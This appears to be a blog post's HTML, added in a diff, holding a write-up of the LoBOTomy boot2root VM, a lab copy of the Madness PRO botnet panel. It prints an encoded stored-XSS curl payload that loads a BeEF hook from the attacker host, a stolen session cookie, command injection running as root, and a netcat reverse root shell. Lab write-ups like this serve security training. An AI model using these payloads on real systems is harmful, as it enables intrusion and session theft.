@@ -1,0 +1,427 @@
+<!doctype html>
+  <!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+  <!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+  <!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+  <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+
+  
+    
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>LoBOTomy - Writeup - vinicius777 - InfoSec</title>
+    <meta name="author" content="Vinicius Marino">
+    
+    <meta name="description" content="LoBOTomy - Writeup Jun 12th, 2014 boot2root From the series Malware Must Die, Bwall @botnet_hunter created the vulnerable VM that allows us to play &hellip;">
+    
+    <meta name="viewport" content="width=device-width">
+    <link rel="canonical" href="http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup">
+    
+    <link href="/favicon.png" rel="icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet">
+    <link href="/atom.xml" rel="alternate" title="vinicius777 - InfoSec" type="application/atom+xml">
+  </head>
+
+
+  <body >
+
+    <header>
+      <div class="grid-wrapper">
+  <div class="grid">
+
+    <div class="grid__item two-fifths lap-four-sixths palm-one-whole">
+  <a href="/" class="site-title">vinicius777 - InfoSec</a>
+</div>
+
+<div class="grid__item three-fifths lap-two-sixths palm-one-whole">
+  <nav>
+    <input type="checkbox" id="toggle">
+<label for="toggle" class="toggle" data-open="Main Menu" data-close="Close Menu"></label>
+<ul class="menu pull-right">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about/">About</a></li>
+  <li><a href="/blog/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/vulns/">Vulnerabilities</a></li>
+  <li><a href="/contact/">Contact</a></li>
+</ul>
+  </nav>
+</div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+    <div class="grid-wrapper">
+      <div class="grid grid-center">
+        
+        <div class="grid__item two-thirds lap-one-whole palm-one-whole">
+        
+
+          <article class="post">
+  <header>
+  
+  <h1 class="title indent">LoBOTomy - Writeup</h1>
+  
+
+  
+  <div class="meta clearfix">
+    
+
+
+
+
+
+
+
+
+  
+
+
+<time class="pull-left" datetime="2014-06-12T09:13:20+10:00" pubdate data-updated="true"><i class="icon-calendar"></i> Jun 12<span>th</span>, 2014</time>
+    
+
+  <div class="pull-left">
+    <i class="icon-tags"></i>
+    <ul class="tags unstyled">
+    
+      
+        <li><a class='category' href='/blog/categories/boot2root/'>boot2root</a></li>
+      
+    
+    </ul>
+  </div>
+
+    
+  </div>
+  
+</header>
+
+
+
+
+  <p>From the series Malware Must Die, Bwall <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a> created the vulnerable VM that allows us to play with the BOTNET without doing anything illegal across the Internet. The VM holds the Madness PRO Panel that is vulnerable by itself. 
+<!-- more --></p>
+
+<h3> Madness PRO! </h3>
+
+<p>Madness PRO is a relatively recent DDoS botnet, fist seen by ASERT in the second half of 2013 and also profiled by <a href="http://malware.dontneedcoffee.com/2013/10/meet-madness-pro-or-few-days-rise-of.html" target="_black"> Kafeine</a> in October 2013.
+A botnet hunter called Bwall woundn’t sleep without spend a good few hours poking the bot and the panel vulnerabilities (silly botters), check his blog at <a href="http://blog.cylance.com/a-study-in-bots-lobotomy" target="_blank"> blog.cylance.com/a-study-in-bots-labotomy </a> and the complete study at <a href="http://blog.cylance.com/a-study-in-bots-madness-pro" target="_blank"> blog.cylance.com/a-study-in-bots-madness-pro<a></a>.</a></p>
+
+<p>Note, before you attempt this VM you may want to read Bwall blog’s post, useful information about how the panel works and what could be used to exploit the panel, in other words, he did the heavy lift for all of us! </p>
+
+<h3> Poke Around </h3>
+
+<p>Once access HTTP you will see information about the VM and a few PROTIPS that you may want to follow during the game!</p>
+
+<center>
+<img src="/images/madness1.png" title="" />
+</center>
+
+<p>A dirb custom wordlist was running on the background trying to get the bot panel source as the protips suggests. The Panel is located in the web root directory “http://192.168.1.25/Panel.zip”.</p>
+
+<p>When unzip the file, ‘inc/config.php’ holds the password used to login  “http://192.168.1.25/m/adm/auth.php” but I know (it’s on Bwall blog) that the panel is vulnerable to XSS and also, SmilerJS access the panel every minute.</p>
+
+<p>Thinking of this perspective, I could setup an evil php cookie stealer and steal the cookies to access the panel as admin (hard way) or type madness/madness user/password also would work and save me from this work.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
+  <div class="code"><pre>
+<span class="local-variable">$conf</span>[<span class="string"><span class="delimiter">'</span><span class="content">adname</span><span class="delimiter">'</span></span>]  = <span class="string"><span class="delimiter">&quot;</span><span class="content">madness</span><span class="delimiter">&quot;</span></span>;  
+<span class="local-variable">$conf</span>[<span class="string"><span class="delimiter">'</span><span class="content">adpass</span><span class="delimiter">'</span></span>]  = <span class="string"><span class="delimiter">&quot;</span><span class="content">madness</span><span class="delimiter">&quot;</span></span>;
+<span class="local-variable">$conf</span>[<span class="string"><span class="delimiter">'</span><span class="content">guname</span><span class="delimiter">'</span></span>]  = <span class="string"><span class="delimiter">&quot;</span><span class="content">mad</span><span class="delimiter">&quot;</span></span>;
+<span class="local-variable">$conf</span>[<span class="string"><span class="delimiter">'</span><span class="content">gupass</span><span class="delimiter">'</span></span>]  = <span class="string"><span class="delimiter">&quot;</span><span class="content">madness</span><span class="delimiter">&quot;</span></span>;
+</pre></div>
+</div>
+ </figure></notextile></div>
+
+<p>Yeah! That’s right, Let’s go for the hard way!</p>
+
+<h3> Hooking </h3>
+
+<p>When comes to XSS, BEEF project is the best tool to use, it does not hold you back! Wondering what would be my life without BEEF framework…</p>
+
+<div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">/usr/share/beef-xss# ./beef</span><span class="line output">	[10:59:06][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
+</span><span class="line output">	[10:59:06][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
+</span><span class="line output">	[10:59:06]    |   Twit: @beefproject
+</span><span class="line output">	[10:59:06]    |   Site: http://beefproject.com
+</span><span class="line output">	[10:59:06]    |   Blog: http://blog.beefproject.com
+</span><span class="line output">	[10:59:06]    |_  Wiki: https://github.com/beefproject/beef/wiki
+</span><span class="line output">	[10:59:06][*] Project Creator: Wade Alcorn (@WadeAlcorn)
+</span><span class="line output">	[10:59:07][*] BeEF is loading. Wait a few seconds...
+</span><span class="line output">	[10:59:07][*] 10 extensions enabled.
+</span><span class="line output">	[10:59:07][*] 171 modules enabled.
+</span><span class="line output">	[10:59:07][*] 2 network interfaces were detected.
+</span><span class="line output">	[10:59:07][+] running on network interface: 127.0.0.1
+</span><span class="line output">	[10:59:07]    |   Hook URL: http://127.0.0.1:3000/hook.js
+</span><span class="line output">	[10:59:07]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+</span><span class="line output">	[10:59:07][+] running on network interface: 192.168.1.13
+</span><span class="line output">	[10:59:07]    |   Hook URL: http://192.168.1.13:3000/hook.js
+</span><span class="line output">	[10:59:07]    |_  UI URL:   http://192.168.1.13:3000/ui/panel
+</span><span class="line output">	[10:59:07][*] RESTful API key: 1dad2d1bf169671680757610ac50df2511f90748
+</span><span class="line output">	[10:59:07][*] HTTP Proxy: http://127.0.0.1:6789
+</span><span class="line output">	[10:59:07][*] BeEF server started (press control+c to stop)</span></code></pre></td></tr></table></div></div>
+        </div>
+
+<p>Once beef is up and ruuning, It’s ready to hook abusing the XSS vulnerability present on the madness panel. Let’s send the request using curl:</p>
+
+<div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">curl -v "http://192.168.1.25/m/?uid=12345%3Cimg%20alt%3D\')%3B%5C%22%3E%3Cscript%20src=\"http://192.168.1.13:3000/hook.js\"&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status(\'12345"</span><span class="line output">* About to connect() to 192.168.1.25 port 80 (#0)
+</span><span class="line output">*   Trying 192.168.1.25...
+</span><span class="line output">* connected
+</span><span class="line output">* Connected to 192.168.1.25 (192.168.1.25) port 80 (#0)
+</span><span class="line output">&gt; GET /m/?uid=12345%3Cimg%20alt%3D\')%3B%5C%22%3E%3Cscript%20src="http://192.168.1.13:3000/hook.js"&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status(\'12345 HTTP/1.1
+</span><span class="line output">&gt; User-Agent: curl/7.26.0
+</span><span class="line output">&gt; Host: 192.168.1.25
+</span><span class="line output">&gt; Accept: */*
+</span><span class="line output">&gt; 
+</span><span class="line output">* additional stuff not fine transfer.c:1037: 0 0
+</span><span class="line output">* HTTP 1.1 or later with persistent connection, pipelining supported
+</span><span class="line output">&lt; HTTP/1.1 200 OK
+</span><span class="line output">&lt; Date: Thu, 12 Jun 2014 01:06:48 GMT
+</span><span class="line output">&lt; Server: Apache/2.4.9 (Debian)
+</span><span class="line output">&lt; X-Powered-By: PHP/5.5.11-3
+</span><span class="line output">&lt; Content-Length: 4
+</span><span class="line output">&lt; Content-Type: text/html
+</span><span class="line output">&lt; 
+</span><span class="line output">* Connection #0 to host 192.168.1.25 left intact
+</span><span class="line output">d3Rm* Closing connection #0</span></code></pre></td></tr></table></div></div>
+        </div>
+
+<p><code>[11:07:32][*] New Hooked Browser [id:3, ip:192.168.1.25, type:UNKNOWN-UNKNOWN, os:Linux], hooked domain [127.0.0.1:80] Cookies: PHPSESSID=vj55ab2vhml525savcgvkrd6p6;</code></p>
+
+<p>SmilerJS browser is hooked. The PHPSESSID allows me to access the Panel as admin if I change my cookies but I am not going to access it because if I do, my browser would be hooked too due to the persistent XSS.</p>
+
+<p>The best thing to do is to enumerate the VM abusing from the XSS using BEFF framework to trun it into a shell access, maybe! ;-)</p>
+
+<h3> Enumeration </h3>
+
+<p>Enumeration over XSS is painful because it’s slow as hell and you have to be patients  about this! It’s even harder/frustration  when your victim closes the hooked browser before you attempt one single exploit. </p>
+
+<p>In this case, time isn’t a problem as the SimilerJS browser connects every minute to our hook.</p>
+
+<p>First, I enumerate the box by scan open ports as localhost, secondly, I ran the XSS proxy (running on localhost:6789 by default).</p>
+
+<center>
+<img src="/images/madness2.png" title="" />
+</center>
+
+<p>Port 8080 is open, and it’s time to run dirbuster over this port!</p>
+
+<h3> Shell Access </h3>
+
+<p>Port 8080 is open and running only for local connections which is at least suspicious, right ? </p>
+
+<p>Dirbuster is up and running, and a unexpected thing happened! When dirbuster tried to get the /id request look what I got in the output:</p>
+
+<p><code>uid=0(root) gid=0(root) groups=0(root)</code></p>
+
+<p>I quickly opened by browser, setting the proxy http confs to localhost:6789 and requested “/uname -a;id”</p>
+
+<center>
+<img src="/images/madness3.png" />
+</center>
+
+<p>Bingo!</p>
+
+<p>Let me run a listener on attacker machine and make the target connect to it using netcat.</p>
+
+<div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">nc -vlp 1111</span><span class="line output">nc: listening on :: 1111 ...
+</span><span class="line output">nc: listening on 0.0.0.0 1111 ...
+</span><span class="line output">nc: connect to 192.168.1.13 1111 from . (192.168.1.25) 60088 [60088]
+</span><span class="line output">python -c 'import pty;pty.spawn("/bin/bash")'
+</span><span class="line output">root@madness:/# id
+</span><span class="line output">id
+</span><span class="line output">uid=0(root) gid=0(root) groups=0(root)
+</span><span class="line output">root@madness:/# ls /root
+</span><span class="line output">ls /root
+</span><span class="line output">bindshell.py  browser.js  slimerjs-0.9.1
+</span><span class="line output">root@madness:/#</span></code></pre></td></tr></table></div></div>
+        </div>
+
+<p>The end of the game!!! Hope you like it! </p>
+
+<p>Thanks to <a href="https://www.vulnhub.com" target="_black"> VulnHub </a> and <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a></p>
+
+<p>Comments are welcome.</p>
+
+
+
+</article>
+
+ 
+<section id="disqus">
+  <h1 class="indent title">Comments</h1>
+  <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+
+        </div>
+
+        
+        <aside id="sidebar" class="grid__item one-third lap-one-whole palm-one-whole">
+          <div class="grid">
+
+  
+<section class="social aside-module grid__item one-whole lap-one-half">
+  <h1 class="title delta">
+    Follow me!
+  </h1>
+  <ul class="unstyled">
+    
+    
+    <li><a class="github" href="//github.com/vinicius777"><i class="icon-github"></i> Github</a></li>
+    
+    <li><a class="gplus" href="//plus.google.com/vinicius777"><i class="icon-google-plus-sign"></i> Google+</a></li>
+    <li><a class="linkedin" href="//linkedin.com/pub/vinicius-marino/1b/273/814"><i class="icon-linkedin-sign"></i> LinkedIn</a></li>
+    
+    
+    <li><a class="twitter" href="//twitter.com/vinicius777_"><i class="icon-twitter"></i> Twitter</a></li>
+    
+  </ul>
+</section>
+
+
+  <section id="recent-posts" class="aside-module grid__item one-whole lap-one-half">
+  <h1 class="title delta">Recent Posts</h1>
+  <ul class="divided">
+    
+      <li class="post">
+        <a href="/blog/2014/06/12/lobotomy-writeup/">LoBOTomy - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/06/03/xssing-google-game/">XSSing - Google Game</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/05/23/secos-writeup/">SecOS - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/05/23/hades-challenge-writeup/">Hades Challenge - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/05/22/brainpan2-challenge-writeup/">Brainpan2 Challenge - Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+<section id="twitter" class="aside-module grid__item one-whole lap-one-half">
+<h1 class="title delta"> Latest Tweets </h1>
+<a class="twitter-timeline" width="400" height="500" href="https://twitter.com/twitterapi" data-chrome="nofooter noborders transparent" align="left" data-widget-id="474377646030086144">Tweets by @twitterapi</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</section>
+
+
+
+
+</div>
+
+        </aside>
+        
+      </div>
+    </div>
+
+    <footer>
+      <div class="grid-wrapper">
+  <div class="grid">
+    <div class="grid__item">
+      <p class="copyright">
+  Powered by<a href="//octopress.org" target="_black"> Octopress</a> - A Blog framework for hackers!<br>
+  Theme desinged by <a href="//github.com/coogie/oscailte" target="_black"> Oscailte</a>.
+  <center><small> Copyright © - 2014 </center>
+</p>
+    </div>
+  </div>
+</div>
+
+    </footer>
+
+    <!--[if lt IE 7]>
+      <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+    <![endif]-->
+
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
+<script src="//crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/md5.js"></script>
+<script defer src="/javascripts/octopress.js"></script>
+
+
+<script>
+  var _gaq=[['_setAccount','UA-51286167-1'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+
+
+<script>
+  var disqus_shortname = 'vinicius777';
+  
+    
+    // var disqus_developer = 1;
+    var disqus_identifier = 'http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup/';
+    var disqus_url = 'http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup/';
+    var disqus_script = 'embed.js';
+  
+  (function () {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  }());
+</script>
+
+
+
+
+<script>
+  $(document).ready(function(){
+    if (!window.jXHR){
+      var jxhr = document.createElement('script');
+      jxhr.type = 'text/javascript';
+      jxhr.src = '/javascripts/libs/jXHR.js';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(jxhr, s);
+    }
+
+    github.showRepos({
+      user: 'vinicius777',
+      count: 0,
+      skip_forks: true,
+      target: '#gh_repos'
+    });
+  });
+</script>
+<script src="/javascripts/github.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
